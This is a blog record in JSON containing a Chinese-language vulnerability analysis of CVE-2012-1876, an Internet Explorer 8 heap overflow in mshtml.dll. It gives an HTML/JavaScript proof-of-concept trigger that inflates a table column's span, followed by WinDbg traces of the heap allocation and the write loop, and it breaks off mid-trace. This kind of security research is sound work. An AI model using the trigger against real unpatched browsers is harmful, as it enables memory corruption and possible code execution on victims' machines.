{"total":10,"pageSize":10,"pageCount":1,"data":[{"title":"CVE-2012-1876调试分析","slug":"CVE-2012-1876调试分析","date":"2019-07-10T12:19:25.000Z","updated":"2019-07-10T12:26:10.564Z","comments":true,"path":"api/articles/CVE-2012-1876调试分析.json","excerpt":"","keywords":null,"cover":"https://images.seebug.org/content/images/2017/01/3-1.png-w331s","content":"<h2 id=\"CVE-2012-1876\"><a href=\"#CVE-2012-1876\" class=\"headerlink\" title=\"CVE-2012-1876\"></a>CVE-2012-1876</h2><h3 id=\"1-漏洞简介\"><a href=\"#1-漏洞简介\" class=\"headerlink\" title=\"1. 漏洞简介\"></a>1. 漏洞简介</h3><p>一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当，那么就会触发堆溢出问题。</p>\n<p>其中mshtml.dll模块是IE中的重要组件，用来解析HTML和CSS。（微软官方说明<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）</a></p>\n<p>系统：Win7 Pro x86</p>\n<p>版本：IE8.0.7601.17514</p>\n<h3 id=\"2-PoC\"><a href=\"#2-PoC\" class=\"headerlink\" title=\"2. PoC\"></a>2. PoC</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span> &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"6\"</span> &gt;</span>&amp;nbsp <span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    function over_trigger() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        var obj_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">        obj_col.width = \"42765\";</span></span><br><span class=\"line\"><span class=\"undefined\">        obj_col.span = 666;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    setTimeout(\"over_trigger();\",1);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上述代码的功能十分清晰，最开始时span的属性值为6，而后通过js中的over_trigger函数将其动态更新为666，当然，更新后的值可以是任意的，只要能保证溢出就可以。另外，width的属性值和写入堆空间的内容有关。</p>\n<h3 id=\"3-调试\"><a href=\"#3-调试\" class=\"headerlink\" title=\"3. 调试\"></a>3. 调试</h3><p>强制下载符号表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:018&gt; .reload /f mshtml.dll</span><br></pre></td></tr></table></figure>\n<p>然后下以下断点：</p>\n<p>这里，由于错误定位是在CTableLayout::CalculateMinMax函数中，所以要下个断点；又因为是个堆溢出，所以HeapRealloc也要下断点；最后的CTableCol::GetAAspan断点是用来获取span属性的。</p>\n<p>首先禁用后两个断点，只停在CalculateMinMax处。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:013&gt; bl</span><br><span class=\"line\">0:013&gt; bp mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\">0:013&gt; bp mshtml!_HeapRealloc</span><br><span class=\"line\">0:013&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class=\"line\">0:013&gt; b l</span><br><span class=\"line\">0:013&gt; bd 1 2</span><br><span class=\"line\">0:013&gt; bl</span><br><span class=\"line\"> 0 e 67c7a078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\"> 1 d 67d2d7a5     0001 (0001)  0:**** mshtml!_HeapRealloc</span><br><span class=\"line\"> 2 d 67bfa6cb     0001 (0001)  0:**** mshtml!CTableCol::GetAAspan</span><br></pre></td></tr></table></figure>\n<p>g运行起来，并允许阻止的内容，终于成功断到了断点处。查看栈现场：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; kb 5</span><br><span class=\"line\">ChildEBP RetAddr  Args to Child              </span><br><span class=\"line\">024ec67c 6b68a6b8 006736f0 024ec910 00000000 mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\">024ec898 6b680879 024ec910 024ec8dc 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class=\"line\">024eca44 6b78566c 024ed960 024ecc70 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class=\"line\">024ecb7c 6b7818f9 006736f0 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class=\"line\">024ecc40 6b781646 006736f0 0002ddfc 0002ddfc mshtml!CFlowLayout::MeasureSite+0x312</span><br></pre></td></tr></table></figure>\n<p>函数的函数声明如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> __thiscall CTableLayout::CalculateMinMax(CTableLayout *__hidden <span class=\"keyword\">this</span>, struct CTableCalcInfo *, <span class=\"keyword\">int</span>)</span><br></pre></td></tr></table></figure>\n<p>我们主要关心函数的第一个参数，即类型为CTableLayout的指针，由上面的调用栈看出其地址为0x6736f0。ln指令查看就近的符号，poi(xxx)表示解引用。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; ln poi(0x6736f0)</span><br><span class=\"line\">(6b589960)   mshtml!CTableLayout::`vftable&apos;   |  (6b589aa0)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class=\"line\">Exact matches:</span><br><span class=\"line\">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd 0x6736f0</span><br><span class=\"line\">006736f0  6b589960 006ba180 0069c1b8 6b73e3b8 # 其中0x6b589960是vtable值</span><br><span class=\"line\">00673700  00000001 00000000 0108080d ffffffff</span><br><span class=\"line\">00673710  00000000 00000000 00000000 ffffffff</span><br><span class=\"line\">00673720  0002ddfc 00015248 00000000 00000000</span><br><span class=\"line\">00673730  00000000 00412802 00000000 00000000</span><br><span class=\"line\">00673740  00000000 00000006 ffffffff ffffffff # 其中0x00000006是属性span的值</span><br><span class=\"line\">00673750  ffffffff ffffffff 6b58a594 00000004</span><br><span class=\"line\">00673760  00000004 00706338 6b58a594 00000018</span><br></pre></td></tr></table></figure>\n<p>然后继续调试，断在分配堆空间的函数_HeapRealloc。gu执行到函数返回，分配结束后查看。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 1 hit</span><br><span class=\"line\">eax=00000000 ebx=00000000 ecx=000000a8 edx=00000000 esi=0067378c edi=00673780 # 0xa8为分配的空间 0x67378c为申请的地址</span><br><span class=\"line\">eip=6b73d7a5 esp=024ec5b4 ebp=024ec5cc iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!_HeapRealloc:</span><br><span class=\"line\">6b73d7a5 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=00000000 ebx=00000000 ecx=77c05dd3 edx=006f179f esi=0067378c edi=00673780</span><br><span class=\"line\">eip=6b7534e2 esp=024ec5bc ebp=024ec5cc iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CImplAry::EnsureSizeWorker+0xa1:</span><br><span class=\"line\">6b7534e2 8bd8            mov     ebx,eax</span><br><span class=\"line\">0:005&gt; dd 0x6736f0 L30</span><br><span class=\"line\">006736f0  6b589960 006ba180 0069c1b8 6b73e3b8</span><br><span class=\"line\">00673700  00000001 00000000 0108080d ffffffff</span><br><span class=\"line\">00673710  00000000 00000000 00000000 ffffffff</span><br><span class=\"line\">00673720  0002ddfc 00015248 00000000 00000000</span><br><span class=\"line\">00673730  00000000 00412802 00000000 00000000</span><br><span class=\"line\">00673740  00000000 00000006 00000000 ffffffff</span><br><span class=\"line\">00673750  00000000 ffffffff 6b58a594 00000004</span><br><span class=\"line\">00673760  00000004 00706338 6b58a594 00000018</span><br><span class=\"line\">00673770  00000006 006af428 00000000 00000000</span><br><span class=\"line\">00673780  6b58a594 00000000 00000000 006f17a0 # 分配的地址为0x6f17a0</span><br><span class=\"line\">00673790  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006737a0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>\n<p>程序申请了堆空间用于保存column的样式信息，每个样式信息占0x1c字节，有多少个样式信息由span属性决定，因此申请0x1c*6 = 0xa8，即_HeapRealloc函数入口断下后ecx寄存器的值，函数调用时的入参如果用到寄存器的话一般都是ecx，返回参数在eax中。同时注意随后分配的初始地址会保存在esi寄存器对应的地址处，即0x6f17a0。</p>\n<p>继续运行程序会在CTableCol::GetAAspan处断下来，也就是获取span值作为写入样式信息时循环的控制次数，返回值保存在eax中，此处为6.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 2 hit</span><br><span class=\"line\">eax=006764f0 ebx=006736f0 ecx=00000032 edx=00000006 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b60a6cb esp=024ec5d4 ebp=024ec67c iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableCol::GetAAspan:</span><br><span class=\"line\">6b60a6cb 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=00000006 ebx=006736f0 ecx=00000002 edx=00682128 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b81f31f esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class=\"line\">6b81f31f 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure>\n<p>然后在刚刚分配的地址处下条件断点（写入时断下），查看向申请的堆空间写入样式信息的过程。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 3 hit</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=006f17b8</span><br><span class=\"line\">eip=6b9b0a49 esp=024ec5bc ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x2f:</span><br><span class=\"line\">6b9b0a49 eb2a            jmp     mshtml!CTableColCalc::AdjustForCol+0x5b (6b9b0a75)</span><br><span class=\"line\">0:005&gt; ub</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x1c:</span><br><span class=\"line\">6b9b0a36 85c0            test    eax,eax</span><br><span class=\"line\">6b9b0a38 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (6b9b0a4b)</span><br><span class=\"line\">6b9b0a3a 6a08            push    8</span><br><span class=\"line\">6b9b0a3c 57              push    edi</span><br><span class=\"line\">6b9b0a3d 8bc3            mov     eax,ebx</span><br><span class=\"line\">6b9b0a3f e83dacbdff      call    mshtml!CUnitValue::SetValue (6b58b681)</span><br><span class=\"line\">6b9b0a44 895e04          mov     dword ptr [esi+4],ebx</span><br><span class=\"line\">6b9b0a47 891e            mov     dword ptr [esi],ebx</span><br><span class=\"line\">0:005&gt; dd 006f17a0 L30</span><br><span class=\"line\">006f17a0  00001004 00001004 00000000 00000000</span><br><span class=\"line\">006f17b0  00000000 00000000 00010048 00000000</span><br><span class=\"line\">006f17c0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f17d0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f17e0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f17f0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1800  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1810  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1820  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1830  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1840  00000000 00000000 3c73b87b 0800285c</span><br><span class=\"line\">006f1850  00689350 00689410 b67bb8f9 08002848</span><br></pre></td></tr></table></figure>\n<p>由poc看出width属性值为41，写入的为41*100=0x1004，事实上程序断下来的时候0x1c个字节的写入已经完成。然后一直单步跟：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=006f17b8</span><br><span class=\"line\">eip=6b9b0a75 esp=024ec5bc ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x5b:</span><br><span class=\"line\">6b9b0a75 5f              pop     edi</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a76 esp=024ec5c0 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x5c:</span><br><span class=\"line\">6b9b0a76 895e08          mov     dword ptr [esi+8],ebx ds:0023:006f17a8=00000000</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a79 esp=024ec5c0 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x5f:</span><br><span class=\"line\">6b9b0a79 5b              pop     ebx</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a7a esp=024ec5c4 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x60:</span><br><span class=\"line\">6b9b0a7a 5d              pop     ebp</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a7b esp=024ec5c8 ebp=024ec67c iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x61:</span><br><span class=\"line\">6b9b0a7b c20c00          ret     0Ch</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f47a esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x558:</span><br><span class=\"line\">6b81f47a ff45ec          inc     dword ptr [ebp-14h]  ss:0023:024ec668=00000000</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f47d esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x55b:</span><br><span class=\"line\">6b81f47d 8b45ec          mov     eax,dword ptr [ebp-14h] ss:0023:024ec668=00000001</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f480 esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x55e:</span><br><span class=\"line\">6b81f480 8345dc1c        add     dword ptr [ebp-24h],1Ch ss:0023:024ec658=00000000</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f484 esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x562:</span><br><span class=\"line\">6b81f484 3b4510          cmp     eax,dword ptr [ebp+10h] ss:0023:024ec68c=00000006</span><br></pre></td></tr></table></figure>\n<p>出现了inc+cmp指令序列，猜想这就是控制堆空间写入样式信息的循环了，这几条汇编的含义是ebp-14处的变量(计数器)每次+1，然后放到eax中，只要与ebp+10处的参数不相同（这里为span的数值），就继续循环。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; d ebp+0x10</span><br><span class=\"line\">024ec68c  00000006 00000000 006736f0 006736f0 # span为6</span><br><span class=\"line\">0:005&gt; d ebp-0x14</span><br><span class=\"line\">024ec668  00000001 00000000 00001004 00000000 # counter此时为1</span><br></pre></td></tr></table></figure>\n<p>然后看下通过js脚本动态更新span之后，程序第二次在CalculateMinMax入口断下时是什么情形，理论上需要重新分配堆空间，毕竟要多写入660个样式信息，而后再获取此时的span值作为循环控制次数，最后才向堆空间写入样式信息。</p>\n<p>第二次断在入口时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; bd 1 2 3</span><br><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 0 hit</span><br><span class=\"line\">eax=ffffffff ebx=006736f0 ecx=00402c02 edx=ffffffff esi=00000000 edi=024ec0f4</span><br><span class=\"line\">eip=6b68a078 esp=024ebe98 ebp=024ec0b0 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax:</span><br><span class=\"line\">6b68a078 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; dd 006f17a0 L30</span><br><span class=\"line\">006f17a0  00001004 00001004 00001004 00000000</span><br><span class=\"line\">006f17b0  00000000 00000000 00010048 00001004</span><br><span class=\"line\">006f17c0  00001004 00001004 00000000 00000000</span><br><span class=\"line\">006f17d0  00000000 00010048 00001004 00001004</span><br><span class=\"line\">006f17e0  00001004 00000000 00000000 00000000</span><br><span class=\"line\">006f17f0  00010048 00001004 00001004 00001004</span><br><span class=\"line\">006f1800  00000000 00000000 00000000 00010048</span><br><span class=\"line\">006f1810  00001004 00001004 00001004 00000000</span><br><span class=\"line\">006f1820  00000000 00000000 00010048 00001004</span><br><span class=\"line\">006f1830  00001004 00001004 00000000 00000000</span><br><span class=\"line\">006f1840  00000000 00010048 3c73b87b 0800285c</span><br><span class=\"line\">006f1850  00689350 00689410 b67bb8f9 08002848</span><br></pre></td></tr></table></figure>\n<p>确实写入了6个0x1c的样式信息。</p>\n<p>然后接下来要写入样式信息了：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; be 1 2</span><br><span class=\"line\">0:005&gt; bl</span><br><span class=\"line\"> 0 e 6b68a078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\"> 1 e 6b73d7a5     0001 (0001)  0:**** mshtml!_HeapRealloc</span><br><span class=\"line\"> 2 e 6b60a6cb     0001 (0001)  0:**** mshtml!CTableCol::GetAAspan</span><br><span class=\"line\"> 3 d 006f17a0 w 1 0001 (0001)  0:**** </span><br><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 2 hit</span><br><span class=\"line\">eax=006764f0 ebx=006736f0 ecx=00000032 edx=00000006 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b60a6cb esp=024ebdec ebp=024ebe94 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableCol::GetAAspan:</span><br><span class=\"line\">6b60a6cb 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span 